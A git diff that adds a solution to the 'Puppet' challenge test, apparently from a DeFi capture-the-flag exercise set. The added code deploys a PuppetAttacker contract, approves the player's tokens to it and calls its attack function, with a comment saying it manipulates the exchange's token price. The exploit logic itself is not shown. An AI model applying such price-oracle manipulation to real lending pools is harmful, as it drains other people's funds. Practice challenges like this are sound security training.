@@ -95,6 +95,22 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Approve and send tokens to the exchange to sell. This will manipulate the price of the token
+        const attackerFactory = await ethers.getContractFactory('PuppetAttacker');
+        const attacker = await attackerFactory.deploy(
+            token.address,
+            uniswapExchange.address,
+            lendingPool.address,
+            {value: 20n * 10n ** 18n}
+        );
+
+        console.log('Attacker address: ', attacker.address);
+        console.log("Pool address: ", lendingPool.address);
+        console.log("Exchange address: ", uniswapExchange.address);
+        console.log("Token address: ", token.address);
+
+        await token.connect(player).approve(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await attacker.attack(player.address);
     });
 
     after(async function () {
